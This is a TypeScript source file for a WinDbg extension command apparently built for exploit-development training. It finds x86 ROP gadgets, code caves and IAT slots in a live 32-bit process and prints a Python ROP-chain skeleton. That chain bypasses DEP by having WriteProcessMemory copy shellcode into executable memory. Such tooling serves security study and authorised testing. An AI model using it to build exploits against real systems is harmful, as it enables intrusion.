import { scanBackward, type DecodedGadget } from "../core/backward_scanner";
import { executeDebuggerCommand, getPointerSize, tryReadMemory } from "../core/memory";
import { forEachSection, type ModuleSection } from "../core/scan_engine";
import { memoryRegion } from "../analysis/memory";
import { findCodeCaves, type CodeCave } from "./code_caves";
import * as out from "../core/output";
import type { Command, CommandResult } from "../core/registry";
import { createShellcodeNamespace } from "../shellcode";
import { readRegisters } from "./triage";

type GadgetName =
  | "PUSH_ESP_POP_ESI" | "MOV_EAX_ESI" | "POP_EBP" | "ADD_EAX_EBP"
  | "XCHG_EAX_EDX" | "POP_EAX" | "NEG_EAX" | "XCHG_EAX_EBP"
  | "MOV_EAX_PTR_EAX" | "MOV_PTR_EDX_EAX" | "INC_EDX"
  | "ADD_EAX_EDX" | "XCHG_EAX_ESP";

const requirements: Array<{ name: GadgetName; body: string[] }> = [
  { name: "PUSH_ESP_POP_ESI", body: ["push esp", "pop esi"] },
  { name: "MOV_EAX_ESI", body: ["mov eax, esi"] },
  { name: "POP_EBP", body: ["pop ebp"] },
  { name: "ADD_EAX_EBP", body: ["add eax, ebp"] },
  { name: "XCHG_EAX_EDX", body: ["xchg eax, edx"] },
  { name: "POP_EAX", body: ["pop eax"] },
  { name: "NEG_EAX", body: ["neg eax"] },
  { name: "XCHG_EAX_EBP", body: ["xchg eax, ebp"] },
  { name: "MOV_EAX_PTR_EAX", body: ["mov eax, dword [eax]"] },
  { name: "MOV_PTR_EDX_EAX", body: ["mov dword [edx], eax"] },
  { name: "INC_EDX", body: ["inc edx"] },
  { name: "ADD_EAX_EDX", body: ["add eax, edx"] },
  { name: "XCHG_EAX_ESP", body: ["xchg eax, esp"] },
];

// These registers are dead after the matching instruction at every use site in
// this fixed WPM skeleton. A filler DWORD repairs the stack, but cannot repair a
// live register clobbered by an extra POP, INC or DEC. The chain does not use flags.
const safeExtraPops: Record<GadgetName, ReadonlySet<string>> = {
  PUSH_ESP_POP_ESI: new Set(["eax", "ebx", "ecx", "edx", "ebp", "edi"]),
  MOV_EAX_ESI: new Set(["ebx", "ecx", "edx", "ebp", "esi", "edi"]),
  POP_EBP: new Set(["ebx", "ecx", "edx", "esi", "edi"]),
  ADD_EAX_EBP: new Set(["ebx", "ecx", "ebp", "esi", "edi"]),
  XCHG_EAX_EDX: new Set(["eax", "ebx", "ecx", "ebp", "esi", "edi"]),
  POP_EAX: new Set(["ebx", "ecx", "esi", "edi"]),
  NEG_EAX: new Set(["ebx", "ecx", "esi", "edi"]),
  XCHG_EAX_EBP: new Set(["eax", "ebx", "ecx", "esi", "edi"]),
  MOV_EAX_PTR_EAX: new Set(["ebx", "ecx", "esi", "edi"]),
  MOV_PTR_EDX_EAX: new Set(["eax", "ebx", "ecx", "esi", "edi"]),
  INC_EDX: new Set(["eax", "ebx", "ecx", "esi", "edi"]),
  ADD_EAX_EDX: new Set(["ebx", "ecx", "ebp", "esi", "edi"]),
  XCHG_EAX_ESP: new Set(),
};

interface Choice {
  gadget: DecodedGadget;
  extraPops: string[];
  extraEffects: string[];
}

function normalizeInstruction(text: string): string {
  return text.toLowerCase().replace(/\s+/g, " ").replace(/\s*,\s*/g, ", ").trim();
}

function parts(gadget: DecodedGadget): string[] {
  return gadget.mnemonic.split(";").map(normalizeInstruction).filter(Boolean);
}

function addressSafe(address: bigint, badchars: ReadonlySet<number>): boolean {
  for (let i = 0; i < 4; i++) {
    if (badchars.has(Number((address >> BigInt(i * 8)) & BigInt(0xff)))) return false;
  }
  return true;
}

function candidate(gadget: DecodedGadget, body: string[]): Choice | undefined {
  if (gadget.kind !== "RET_CHAIN") return undefined;
  const instructions = parts(gadget);
  const terminal = instructions.pop() ?? "";
  if (!/^ret(?:n)?(?: 0x[0-9a-f]+)?$/.test(terminal)) return undefined;
  if (instructions.length < body.length) return undefined;
  if (!body.every((wanted, i) => instructions[i] === wanted)) return undefined;
  const extra = instructions.slice(body.length);
  if (!extra.every((instruction) => /^(?:pop|inc|dec) (?:eax|ebx|ecx|edx|ebp|esi|edi)$/.test(instruction))) return undefined;
  return {
    gadget,
    extraPops: extra.filter((instruction) => instruction.startsWith("pop ")).map((instruction) => instruction.slice(4)),
    extraEffects: extra.filter((instruction) => !instruction.startsWith("pop ")),
  };
}

export function chooseManualWpmGadgets(
  gadgets: readonly DecodedGadget[], badchars: readonly number[],
): Record<GadgetName, Choice | undefined> {
  const excluded = new Set(badchars);
  const selected = {} as Record<GadgetName, Choice | undefined>;
  for (const requirement of requirements) {
    const choices = gadgets
      .filter((gadget) => gadget.address >= BigInt(0) && gadget.address <= BigInt(0xffffffff) && addressSafe(gadget.address, excluded))
      .map((gadget) => candidate(gadget, requirement.body))
      .filter((choice): choice is Choice => choice !== undefined)
      .filter((choice) => choice.extraPops.every((register) => safeExtraPops[requirement.name].has(register)))
      .filter((choice) => choice.extraEffects.every((instruction) => safeExtraPops[requirement.name].has(instruction.split(" ")[1])))
      // RETN after XCHG EAX,ESP skips bytes in the WPM call frame, not the old chain.
      .filter((choice) => requirement.name !== "XCHG_EAX_ESP" || choice.gadget.retImm === 0)
      .sort((a, b) =>
        a.extraEffects.length - b.extraEffects.length
        || a.extraPops.length - b.extraPops.length
        || Number(a.gadget.retImm > 0) - Number(b.gadget.retImm > 0)
        || a.gadget.retImm - b.gadget.retImm
        || Number(a.gadget.address - b.gadget.address));
    selected[requirement.name] = choices[0];
  }
  return selected;
}

function parseBadchars(value: unknown): number[] | undefined {
  if (value === undefined || value === "") return [];
  if (Array.isArray(value) && value.every((item) => Number.isInteger(item) && item >= 0 && item <= 255)) {
    return [...new Set(value as number[])];
  }
  if (typeof value !== "string") return undefined;
  const tokens = value.trim().split(/[\s,]+/).filter(Boolean);
  if (!tokens.every((token) => /^(?:0x)?[0-9a-fA-F]{2}$/.test(token))) return undefined;
  return [...new Set(tokens.map((token) => parseInt(token.replace(/^0x/i, ""), 16)))];
}

function hex32(value: bigint): string {
  return `0x${value.toString(16).toUpperCase().padStart(8, "0")}`;
}

type ManualWpmFacts = { esp?: number; frame?: number; shellcode?: number; wpmOffset?: number; iat?: number; bytesWritten?: number };
export type ManualWpmValues = { eipDelta?: number; negativeWpmOffset?: number; iatAddress?: number; negativeShellcodeDelta?: number; bytesWritten?: number; codeCave?: number; codeCaveSize?: number; codeCaveSource?: string };

export function selectManualWpmCave(
  caves: readonly CodeCave[], minSize: number, badchars: readonly number[],
  isExecuteRead: (address: bigint) => boolean,
): { address: number; size: number; source: string } | undefined {
  const excluded = new Set(badchars);
  for (const cave of caves) {
    // Leave one DWORD at each edge: padding scanners can disagree on boundary bytes.
    if (cave.executable !== true || cave.size < minSize + 8) continue;
    const first = cave.address + BigInt(4);
    const end = cave.address + BigInt(cave.size) - BigInt(4);
    if (!isExecuteRead(first)) continue;
    for (let address = first; address + BigInt(minSize) <= end && address <= BigInt(0xffffffff); address++) {
      if (!addressSafe(address, excluded)) continue;
      const bytes = Array.from({ length: 4 }, (_, i) => Number((address >> BigInt(i * 8)) & BigInt(0xff))
        .toString(16).toUpperCase().padStart(2, "0")).join(" ");
      return {
        address: Number(address), size: Number(end - address),
        source: `${cave.module} ${cave.section} PAGE_EXECUTE_READ; address bytes ${bytes}`.replace(/[\r\n]/g, " "),
      };
    }
  }
  return undefined;
}

export function calculateManualWpmValues(facts: ManualWpmFacts): ManualWpmValues {
  return {
    eipDelta: facts.esp === undefined || facts.frame === undefined ? undefined : (facts.frame - facts.esp) >>> 0,
    negativeWpmOffset: facts.wpmOffset,
    iatAddress: facts.iat,
    negativeShellcodeDelta: facts.frame === undefined || facts.shellcode === undefined
      ? undefined : (facts.frame + 16 - facts.shellcode) >>> 0,
    bytesWritten: facts.bytesWritten,
  };
}

export function chooseBytesWrittenAddress(
  sections: readonly ModuleSection[], badchars: readonly number[],
  usable: (address: bigint) => boolean,
): number | undefined {
  const excluded = new Set(badchars);
  const candidates = sections.filter((section) => section.name.toLowerCase().startsWith(".data"))
    .map((section) => ({ section, address: section.start + BigInt(section.size) + BigInt(4) }))
    .filter(({ section, address }) => address + BigInt(4) <= section.module.base + section.module.size
      && !sections.some((other) => other !== section && other.module.base === section.module.base
        && address >= other.start && address < other.start + BigInt(other.size)))
    .map(({ address }) => address)
    .filter((address) => address >= BigInt(0) && address <= BigInt(0xffffffff))
    .filter((address) => addressSafe(address, excluded) && usable(address));
  return candidates.length === 1 ? Number(candidates[0]) : undefined;
}

export function selectSafeIatAddress(slots: readonly number[], badchars: readonly number[]): number | undefined {
  const excluded = new Set(badchars);
  const safe = [...new Set(slots.filter((address) => Number.isInteger(address) && address >= 0 && address <= 0xffffffff
    && addressSafe(BigInt(address), excluded)))];
  return safe.length === 1 ? safe[0] : undefined;
}

function liveBytesWrittenAddress(module: string | undefined, badchars: readonly number[]): number | undefined {
  const sections = forEachSection({ module, executableOnly: false, maxResults: 1, chunkSize: 0x4000 }).sections;
  return chooseBytesWrittenAddress(sections, badchars, (address) => {
    const bytes = tryReadMemory(address, 4);
    const protection = memoryRegion(address);
    return bytes?.length === 4 && bytes.every((byte) => byte === 0)
      && protection.writable === true && protection.committed !== false;
  });
}

function moduleStem(name: string): string {
  return name.replace(/\\/g, "/").split("/").pop()?.replace(/\.(?:dll|exe)$/i, "").toLowerCase() ?? "";
}

function parseAddress(text: string): number | undefined {
  const match = /\b0x([0-9a-f]{1,8})\b/i.exec(out.stripDml(text));
  return match ? parseInt(match[1], 16) >>> 0 : undefined;
}

function parseBytePattern(text: string): number[] | undefined {
  const tokens = text.trim().split(/[\s,]+/).filter(Boolean);
  if (tokens.length < 4 || !tokens.every((part) => /^(?:0x)?[0-9a-f]{2}$/i.test(part))) return undefined;
  return tokens.map((part) => parseInt(part.replace(/^0x/i, ""), 16));
}

function uniquePatternNearEsp(esp: number, pattern: readonly number[], aligned: boolean): number | undefined {
  if (pattern.length < 4) return undefined;
  const start = Math.max(0, esp - 0x2000);
  const end = Math.min(0x100000000, esp + 0x4000);
  let found: number | undefined;
  for (let address = start; address < end; address += 0x100) {
    const size = Math.min(0x100 + pattern.length - 1, end - address);
    const bytes = tryReadMemory(BigInt(address), size);
    if (!bytes) continue;
    for (let i = 0; i < Math.min(0x100, bytes.length - pattern.length + 1); i++) {
      const hit = address + i;
      if (aligned && hit % 4 !== 0) continue;
      if (!pattern.every((byte, n) => bytes[i + n] === byte)) continue;
      if (found !== undefined && found !== hit) return undefined;
      found = hit;
    }
  }
  return found;
}

function liveManualWpmValues(shellcodeSpec: string, frameSpec: string, module: string | undefined, badchars: readonly number[]): ManualWpmValues {
  const sp = readRegisters(4).sp;
  const esp = sp !== undefined && sp >= BigInt(0) && sp <= BigInt(0xffffffff) ? Number(sp) : undefined;
  const frame = parseAddress(frameSpec) ?? (esp === undefined ? undefined : uniquePatternNearEsp(esp, parseBytePattern(frameSpec) ?? [], true));
  const shellcode = parseAddress(shellcodeSpec) ?? (esp === undefined || !shellcodeSpec
    ? undefined : uniquePatternNearEsp(esp, parseBytePattern(shellcodeSpec) ?? [], false));
  let wpmOffset: number | undefined;
  try {
    const lines = executeDebuggerCommand("? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub");
    for (const line of lines) {
      const match = /=\s*([0-9a-f`]{8,17})\b/i.exec(line);
      if (match) { wpmOffset = parseInt(match[1].replace(/`/g, ""), 16) >>> 0; break; }
    }
  } catch (_error) { /* Symbols or command execution may be unavailable. */ }
  let iat: number | undefined;
  try {
    const rows = out.capture(() => createShellcodeNamespace().iat_find("GetLastErrorStub")).value.rows.toArray();
    const slots = rows.filter((row) => {
      const record = row as unknown as Record<string, unknown>;
      return /GetLastErrorStub\b/i.test(out.stripDml(String(record.Symbol ?? "")))
        && (!module || moduleStem(out.stripDml(String(record.Owner ?? ""))) === moduleStem(module));
    })
      .map((row) => parseAddress(String((row as unknown as Record<string, unknown>).Slot ?? "")))
      .filter((value): value is number => value !== undefined);
    iat = selectSafeIatAddress(slots, badchars);
  } catch (_error) { /* An import may be absent or unreadable. */ }
  return calculateManualWpmValues({ esp, frame, shellcode, wpmOffset, iat, bytesWritten: liveBytesWrittenAddress(module, badchars) });
}

export function renderManualWpmPlan(
  selected: Record<GadgetName, Choice | undefined>, badchars: readonly number[], values: ManualWpmValues = {},
): string[] {
  const lines: string[] = [
    "from struct import pack",
    `badchars = bytes.fromhex("${badchars.map((byte) => byte.toString(16).padStart(2, "0")).join(" ")}")`,
    "",
    `codeCaveSize = ${values.codeCaveSize === undefined ? "None" : hex32(BigInt(values.codeCaveSize))}  # usable bytes from selected cave address`,
    "# WPM call frame. Check the cave against the actual shellcode size before use.",
    "def GetWriteProcessMemoryTemplate() -> bytes:",
    `    codeCaveAd = ${values.codeCave === undefined ? "None  # No safe executable code cave found; choose manually" : `${hex32(BigInt(values.codeCave))}  # auto: ${values.codeCaveSource ?? "executable cave"}; current mapping`}`,
    `    lpNumberOfBytesWritten = ${values.bytesWritten === undefined ? "None" : hex32(BigInt(values.bytesWritten))}  # .data VA + VirtualSize + 4; verified zero and writable`,
    "    wpm  = pack('<L', 0x45454545)  # dummy WPM address",
    "    wpm += pack('<L', codeCaveAd)  # shellcode return address",
    "    wpm += pack('<L', 0xFFFFFFFF)  # current process pseudo handle",
    "    wpm += pack('<L', codeCaveAd)  # lpBaseAddress: code cave",
    "    wpm += pack('<L', 0x47474747)  # dummy lpBuffer",
    "    wpm += pack('<L', 0x48484848)  # dummy nSize",
    "    wpm += pack('<L', lpNumberOfBytesWritten)",
    "    if any(byte in badchars for byte in wpm): raise ValueError('WPM frame contains badchars; review addresses and placeholders')",
    "    return wpm",
    "",
    "# Six manual ROP steps; live values are filled only when unambiguous.",
  ];
  const safeByte = [0x41, 0x90, 0x42, 0x43, ...Array.from({ length: 256 }, (_, i) => i)]
    .find((byte) => !badchars.includes(byte));
  if (safeByte === undefined) {
    throw new Error("No padding byte is safe under the supplied badchars.");
  }
  const padding = `b"\\x${safeByte.toString(16).padStart(2, "0")}"`;
  for (const { name } of requirements) {
    const choice = selected[name];
    const label = `GADGET_${name}`;
    if (!choice) {
      lines.push(`${label} = None  # No direct GADGET, DO IT MANNUALLY`);
      continue;
    }
    const suffix = choice.extraEffects.length
      ? ` # NEED TO BE CHECKED, ROP PERFORMS MORE TASKS: ${choice.gadget.mnemonic}`
      : choice.extraPops.length || choice.gadget.retImm
        ? ` # No direct GADGET; Optional Gadget: ${choice.gadget.mnemonic}`
        : ` # ${choice.gadget.mnemonic}`;
    lines.push(`${label} = ${hex32(choice.gadget.address)}${suffix}`);
  }
  lines.push(
    "",
    "# Live values are filled only when the debugger gives one unambiguous match.",
    `eip_delta = ${values.eipDelta === undefined ? "None" : hex32(BigInt(values.eipDelta))}  # WPM slot - ESP at the first gadget; verify: ? <WPM_slot> - @esp`,
    `negative_wpm_offset = ${values.negativeWpmOffset === undefined ? "None" : hex32(BigInt(values.negativeWpmOffset))}  # ? KERNEL32!GetLastErrorStub - KERNEL32!WriteProcessMemoryStub`,
    `iat_address = ${values.iatAddress === undefined ? "None" : hex32(BigInt(values.iatAddress))}  # dx @$osed().sc.iat_find("GetLastErrorStub")`,
    `negative_shellcode_delta = ${values.negativeShellcodeDelta === undefined ? "None" : hex32(BigInt(values.negativeShellcodeDelta))}  # ? <lpBuffer_slot> - <shellcode_address>`,
    "difference = -20                # WPM slot - EDX nSize slot (five DWORDs)",
    "",
    "def GetROP(restoreRop: bytes, shellcode_size: int) -> bytes:",
    "    if codeCaveSize is not None and shellcode_size > codeCaveSize: raise ValueError('Shellcode exceeds the selected code cave')",
    "    rop = b\"\"",
  );
  let pendingRet = 0;
  let pendingRetWithoutDecoder = 0;
  const emit = (name: GadgetName, value?: string): void => {
    const choice = selected[name];
    lines.push(`    rop += pack("<L", GADGET_${name})`);
    if (pendingRet) lines.push(`    rop += ${padding} * ${pendingRet}  # retn 0x${pendingRet.toString(16)} skips these bytes`);
    if (pendingRetWithoutDecoder) {
      lines.push(`    if not restoreRop: rop += ${padding} * ${pendingRetWithoutDecoder}  # preceding retn with no decoder`);
      pendingRetWithoutDecoder = 0;
    }
    if (value !== undefined) lines.push(`    rop += pack("<L", ${value})  # value consumed by pop`);
    for (const reg of choice?.extraPops ?? []) {
      lines.push(`    rop += ${padding} * 4  # extra pop ${reg}`);
    }
    pendingRet = choice?.gadget.retImm ?? 0;
  };
  const section = (title: string): void => { lines.push("", `    # ${title}`); };
  section("1. Get ESP: capture ESP in ESI");
  emit("PUSH_ESP_POP_ESI");
  section("2. EIP calculation: locate the WPM slot");
  emit("MOV_EAX_ESI");
  emit("POP_EBP", "eip_delta & 0xFFFFFFFF");
  emit("ADD_EAX_EBP");
  emit("XCHG_EAX_EDX");

  section("3. Patch WriteProcessMemory in the WPM template");
  emit("POP_EAX", "negative_wpm_offset & 0xFFFFFFFF");
  emit("NEG_EAX");
  emit("XCHG_EAX_EBP");
  emit("POP_EAX", "iat_address");
  emit("MOV_EAX_PTR_EAX");
  emit("ADD_EAX_EBP");
  emit("MOV_PTR_EDX_EAX");

  section("4. Get and patch lpBuffer");
  for (let i = 0; i < 16; i++) emit("INC_EDX");
  lines.push("    # 4.2.2.1: Recheck negative_shellcode_delta after generating the shellcode or decoder; its address may change.");
  emit("POP_EAX", "negative_shellcode_delta & 0xFFFFFFFF");
  emit("NEG_EAX");
  emit("ADD_EAX_EDX");
  emit("MOV_PTR_EDX_EAX");
  for (let i = 0; i < 4; i++) emit("INC_EDX");
  if (pendingRet) {
    lines.push("    if restoreRop:");
    lines.push("        if len(restoreRop) < 4: raise ValueError('restoreRop must contain a full gadget address')");
    lines.push(`        rop += restoreRop[:4] + ${padding} * ${pendingRet} + restoreRop[4:]  # retn padding after decoder's first address`);
    pendingRetWithoutDecoder = pendingRet;
  } else {
    lines.push("    rop += restoreRop  # optional shellcode decoder chain");
  }
  // restoreRop is an opaque chain. Its own final RETN, if any, must already be padded.
  pendingRet = 0;

  section("5. Patch nSize in the WPM template");
  emit("POP_EAX", "(-shellcode_size) & 0xFFFFFFFF");
  emit("NEG_EAX");
  emit("MOV_PTR_EDX_EAX");
  section("6. Execute WriteProcessMemory");
  emit("POP_EAX", "difference & 0xFFFFFFFF");
  emit("ADD_EAX_EDX");
  emit("XCHG_EAX_ESP");
  if (pendingRet) lines.push(`    # No safe automatic padding after ESP pivot: verify the selected gadget manually.`);
  lines.push("    if any(byte in badchars for byte in rop): raise ValueError('ROP chain contains badchars; review gadgets, constants and restoreRop')");
  lines.push("    return rop");
  return lines;
}

export function createDepPlanManualCommand(): Command {
  return {
    name: "dep_plan_manual",
    description: "Find x86 gadgets and print a manually completed WPM ROP skeleton.",
    usage: 'dx @$osed().dep_plan_manual("WPM", module?, badchars?, shellcodeAddressOrBytes?, frameAddressOrMarker?, minCaveSize?)',
    examples: ['dx @$osed().dep_plan_manual("WPM", "", "00 0A 0D 25 26 2B 3D")'],
    schema: {
      method: { type: "string", required: true },
      module: { type: "string" },
      badchars: { type: "string" },
      shellcode: { type: "string" },
      frame: { type: "string" },
      minCaveSize: { type: "number", min: 1, default: 0x210 },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const method = String(options.method).trim().toLowerCase();
      if (method !== "wpm" && method !== "writeprocessmemory") {
        return { command: "dep_plan_manual", args: options, success: false, findings: [], warnings: [], errors: ['Use "WPM" or "WriteProcessMemory".'] };
      }
      if (getPointerSize() !== 4) {
        return { command: "dep_plan_manual", args: options, success: false, findings: [], warnings: [], errors: ["The manual WPM plan requires a 32-bit target."] };
      }
      const badchars = parseBadchars(options.badchars);
      if (!badchars) {
        return { command: "dep_plan_manual", args: options, success: false, findings: [], warnings: [], errors: ["Badchars must be two-digit hexadecimal bytes separated by spaces or commas."] };
      }
      const module = String(options.module ?? "").trim() || undefined;
      const minCaveSize = Number(options.minCaveSize ?? 0x210);
      if (!Number.isInteger(minCaveSize) || minCaveSize < 1 || minCaveSize > 0x100000) {
        return { command: "dep_plan_manual", args: options, success: false, findings: [], warnings: [], errors: ["minCaveSize must be an integer from 1 to 0x100000 bytes."] };
      }
      const scan = scanBackward({ module, maxResults: 100000, maxInstructionsPerGadget: 6, maxBackwardBytes: 12 });
      const chosen = chooseManualWpmGadgets(scan.gadgets, badchars);
      const values = liveManualWpmValues(String(options.shellcode ?? ""), String(options.frame ?? "45 45 45 45"), module, badchars);
      const badText = badchars.map((byte) => byte.toString(16).padStart(2, "0")).join(" ");
      const caveScan = findCodeCaves(module, minCaveSize + 8, 10000, badText, "EXEC");
      const cave = selectManualWpmCave(caveScan.caves, minCaveSize, badchars, (address) => {
        const region = memoryRegion(address);
        return region.committed === true && region.raw.protection === 0x20;
      });
      if (cave) { values.codeCave = cave.address; values.codeCaveSize = cave.size; values.codeCaveSource = cave.source; }
      const lines = renderManualWpmPlan(chosen, badchars, values);
      out.section("Manual WPM ROP Plan");
      for (const line of lines) out.print(line);
      const missing = requirements.filter(({ name }) => !chosen[name]).map(({ name }) => name);
      const warnings = [...scan.warnings, ...caveScan.warnings];
      if (scan.stats.stoppedEarly === 1) warnings.push("Gadget scan reached its candidate limit; missing gadgets may exist later in the module.");
      if (missing.length) warnings.push(`No direct gadget for: ${missing.join(", ")}.`);
      if (values.eipDelta === undefined) warnings.push("eip_delta needs one WPM frame marker near ESP; pass the frame address or unique marker as argument 5.");
      if (values.negativeWpmOffset === undefined) warnings.push("WPM symbol offset unavailable; check symbols with the ? command printed above.");
      if (values.iatAddress === undefined) warnings.push("No unique badchar-safe GetLastErrorStub IAT slot; inspect sc.iat_find before choosing one.");
      if (values.negativeShellcodeDelta === undefined) warnings.push("Shellcode delta needs a known address or unique byte signature as argument 4, plus the WPM frame address.");
      if (values.bytesWritten === undefined) warnings.push("lpNumberOfBytesWritten needs one unambiguous .data section with a zero, writable DWORD at VA + VirtualSize + 4; pass the module name to narrow the search, then verify with !dh -a and !vprot.");
      if (!cave) warnings.push(`No PAGE_EXECUTE_READ code cave of at least 0x${minCaveSize.toString(16)} usable bytes with a badchar-safe address; inspect code_caves and !vprot or choose one manually.`);
      for (const warning of warnings) out.warn(warning);
      return {
        command: "dep_plan_manual", args: { method: "WPM", module: module ?? "", badchars },
        success: true, findings: [{ lines, missing, selected: chosen, values }], warnings, errors: [], stats: scan.stats,
      };
    },
  };
}
